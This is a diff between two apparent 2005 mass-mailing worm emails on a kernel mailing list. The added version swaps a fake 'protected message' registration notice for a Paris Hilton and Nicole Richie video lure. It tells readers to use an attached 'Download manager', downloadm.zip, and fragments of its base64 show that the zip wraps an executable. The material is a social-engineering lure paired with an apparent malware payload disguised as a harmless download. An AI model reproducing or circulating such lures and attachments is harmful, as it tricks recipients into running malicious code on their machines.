@@ -1,29 +1,30 @@
-From: office@student.utwente.nl
-Subject: Registration Confirmation
-Date: Tue, 20 Dec 2005 01:36:42 UTC
-Message-ID: <448e3c83b3.cfae98b63@student.utwente.nl>
+From: webmaster@bastard.net
+Subject: Paris Hilton & Nicole Richie
+Date: Tue, 20 Dec 2005 04:08:34 GMT
+Message-ID: <8339e5add8b.1a96f3@ifogrjorp.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===57fee4d6c988728.ed11d934c"
+Content-Type: multipart/mixed; boundary="ebbecd47d7cbc2"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: Z-User@oss.sgi.com
+To: mailingbox@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---===57fee4d6c988728.ed11d934c
+--ebbecd47d7cbc2
 
-Protected message is attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.student.utwente.nl
-***** Email: postman@student.utwente.nl
---===57fee4d6c988728.ed11d934c
-Content-Type: application/octet-stream; name=reg_pass.zip
+Please use our Download manager.
+--ebbecd47d7cbc2
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---===57fee4d6c988728.ed11d934c--
+--ebbecd47d7cbc2--
